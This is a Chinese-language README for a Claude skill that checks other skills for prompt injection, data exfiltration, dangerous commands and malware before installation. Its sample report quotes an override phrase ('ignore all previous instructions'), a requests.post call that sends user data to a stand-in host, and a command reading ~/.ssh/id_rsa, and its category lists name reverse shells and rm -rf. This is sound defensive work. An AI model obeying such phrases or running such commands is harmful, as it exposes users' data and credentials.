# Security Checker Skill - 使用说明

## 📋 概述

Security Checker 是一个自动化的安全检查工具，用于在安装新的skill之前分析其内容，检测潜在的安全风险。

## 🎯 功能特点

- ✅ **自动触发**：当你要安装新skill时自动运行检查
- 🔍 **全面扫描**：分析SKILL.md、脚本、参考文档和资源文件
- 🛡️ **多层检测**：识别提示注入、恶意代码、数据泄露、权限滥用等风险
- 📊 **清晰报告**：按风险级别分类，提供具体位置和修复建议
- ✋ **用户控制**：发现风险后需经你明确同意才继续安装

## 🚀 如何使用

### 方法1：自动触发（推荐）

当你要安装新skill时，Security Checker会自动运行：

```
你：请帮我安装这个skill（上传.skill文件）
Claude：正在进行安全检查...
[生成安全报告]
Claude：发现X个潜在风险，是否继续安装？
```

### 方法2：主动检查

你也可以主动请求安全检查：

```
你：请检查这个skill的安全性（提供文件或路径）
Claude：[执行安全分析并生成报告]
```

## 🔍 检测范围

Security Checker会检查以下安全风险：

### 1️⃣ 提示注入攻击
- 试图覆盖或忽略系统指令
- 角色劫持和身份伪装
- 隐藏在注释或条件中的恶意指令

### 2️⃣ 数据泄露风险  
- 未授权的外部网络连接
- 向外部服务器发送数据
- 收集和存储敏感信息

### 3️⃣ 权限滥用
- 访问敏感系统目录（/etc, /root, .ssh, .aws等）
- 执行危险命令（rm -rf, chmod 777, sudo等）
- 过度宽泛的权限请求

### 4️⃣ 恶意代码
- 反向shell和远程控制
- 加密货币挖矿
- 键盘记录和监控
- 持久化机制（crontab, 启动脚本等）

### 5️⃣ 社会工程学
- 假冒官方身份
- 制造紧急感以绕过审查
- 滥用信任关系

### 6️⃣ 隐蔽操控
- 编码和混淆（base64, 零宽字符等）
- 时间炸弹（延迟触发的恶意行为）
- 反调试和反分析代码

## 📊 风险级别

报告中的风险分为四个级别：

| 级别 | 说明 | 建议行动 |
|------|------|----------|
| 🚨 **CRITICAL（严重）** | 明确的恶意代码或严重威胁 | **强烈建议拒绝安装** |
| ⚠️ **HIGH（高）** | 可能导致安全问题的可疑行为 | 建议拒绝或要求修改 |
| ⚡ **MEDIUM（中）** | 潜在的安全隐患或不当实现 | 提醒注意，建议审查 |
| ℹ️ **LOW（低）** | 最佳实践建议，无直接威胁 | 可以安装，提供建议 |

## 💡 使用建议

### ✅ 应该做的：

1. **审查报告**：仔细阅读每个发现的风险
2. **理解后果**：了解每个风险可能造成的影响
3. **谨慎决策**：只在完全理解风险后才选择继续
4. **信任来源**：优先使用来自可信渠道的skill
5. **定期检查**：定期审查已安装的skills

### ❌ 不应该做的：

1. ❌ 不要盲目点击"继续"而不阅读报告
2. ❌ 不要安装包含CRITICAL或HIGH风险的skill（除非你完全理解并接受风险）
3. ❌ 不要安装经过混淆或编码的skill
4. ❌ 不要从不可信的来源下载skill
5. ❌ 不要忽视异常行为的警告

## 📝 报告示例

### 示例1：发现严重风险 🚨

```
🔒 Skill安全检查报告
========================

Skill名称: suspicious-tool
检查时间: 2025-02-06 10:30:00

风险摘要:
- 严重风险: 2 个 🚨
- 高风险: 1 个 ⚠️
- 中风险: 0 个
- 低风险: 0 个

详细发现:

[严重风险 - CRITICAL] 🚨
1. 提示注入攻击
   位置: SKILL.md, line 45
   内容: "ignore all previous instructions..."
   说明: 试图覆盖系统安全限制
   建议: 拒绝安装

2. 未授权网络连接
   位置: scripts/helper.py, line 23  
   内容: requests.post("http://unknown.com", data=user_data)
   说明: 尝试向外部服务器发送用户数据
   建议: 拒绝安装

[高风险 - HIGH] ⚠️
3. 访问敏感目录
   位置: scripts/setup.sh, line 12
   内容: cat ~/.ssh/id_rsa
   说明: 试图读取SSH私钥
   建议: 拒绝安装或移除此代码

========================
总体评估: 拒绝安装 ❌

⚠️ 发现严重安全风险，强烈建议不要安装此skill。
是否仍要继续？（继续/取消）
```

### 示例2：无明显风险 ✅

```
✅ 安全检查完成

Skill名称: pdf-helper
检查时间: 2025-02-06 10:35:00

风险摘要:
- 严重风险: 0 个
- 高风险: 0 个  
- 中风险: 0 个
- 低风险: 1 个

详细发现:

[低风险 - LOW] ℹ️
1. 文件操作 - 正常用途
   位置: scripts/rotate_pdf.py
   说明: PDF编辑skill进行文件读写是正常操作
   建议: 操作范围合理，符合skill描述

========================
总体评估: 安全 ✅

✅ 初步检查未发现明显安全风险。
建议：可以安装，但仍需注意skill的实际行为。

是否继续安装？（继续/取消）
```

## ⚙️ 安装方法

1. **下载文件**：获取 `security-checker.skill` 文件
2. **在Claude中安装**：
   - 打开Claude（claude.ai或Claude应用）
   - 进入Project设置 > Skills
   - 点击"Add skill"或"+"
   - 上传 `security-checker.skill` 文件
3. **完成**：Security Checker会在需要时自动运行

## 🔧 技术细节

### 文件结构

```
security-checker.skill
├── SKILL.md                    # 核心工作流程和检测逻辑
└── references/
    ├── security_patterns.md    # 详细的风险检测模式库
    └── usage_examples.md       # 使用示例和场景说明
```

### 检测方法

1. **关键词检测**：快速识别已知的恶意模式
2. **语义分析**：理解代码和指令的实际意图
3. **异常检测**：识别与skill声明功能不符的操作
4. **上下文分析**：评估操作是否在合理范围内
5. **路径分析**：追踪可能的执行路径和条件分支

## ⚠️ 重要提醒

### 局限性

Security Checker提供自动化的初步安全检查，但**不能保证检测所有风险**：

- ✗ 不能检测所有高级攻击技术
- ✗ 不能识别零日漏洞
- ✗ 不能防范特别巧妙的隐藏手段
- ✗ 不能替代人工审查

### 你的责任

最终的安全责任在于你的判断和决策：

1. 只安装来自可信来源的skill
2. 审查skill的实际行为
3. 限制skill的权限范围  
4. 对异常行为保持警惕
5. 定期审查已安装的skills

## 🆘 常见问题

### Q: 为什么需要Security Checker？

A: Skills可以访问文件、执行代码、调用API等，如果包含恶意内容可能造成数据泄露、系统破坏或其他安全问题。Security Checker帮助在安装前识别这些风险。

### Q: Security Checker会误判吗？

A: 可能会。我们采用保守策略，宁可误报也不漏报。如果你确定某个被标记的内容是安全的，可以解释其用途后选择继续安装。

### Q: 如何处理误报？

A: 仔细阅读报告，理解为什么被标记为风险。如果你确认是误报（例如，PDF编辑器需要文件访问权限），可以选择继续安装。

### Q: 发现CRITICAL风险还能安装吗？

A: 技术上可以，但**强烈不建议**。CRITICAL级别表示明确的恶意行为，安装会带来严重安全威胁。

### Q: 如何确保Security Checker本身是安全的？

A: 你可以审查Security Checker的代码。它只包含：
- SKILL.md：工作流程说明
- references/security_patterns.md：风险模式库  
- references/usage_examples.md：使用示例

没有可执行脚本，不修改系统，不发送数据。

### Q: 检查需要多长时间？

A: 通常几秒到几十秒，取决于skill的大小和复杂度。

### Q: 已安装的skill出问题怎么办？

A: 立即：
1. 停用该skill
2. 删除相关文件
3. 检查是否有异常文件或进程
4. 必要时重置环境或更改密码

## 📞 支持和反馈

如果你：
- 发现Security Checker的误报
- 有改进建议
- 遇到技术问题
- 发现新的威胁模式

请通过Claude的反馈功能或GitHub提交issue。

## 📄 许可证

本skill基于安全和教育目的创建，旨在帮助用户更安全地使用Claude Skills生态系统。

---

**记住：安全是共同的责任。保持警惕，谨慎安装，享受安全的Claude体验！** 🛡️
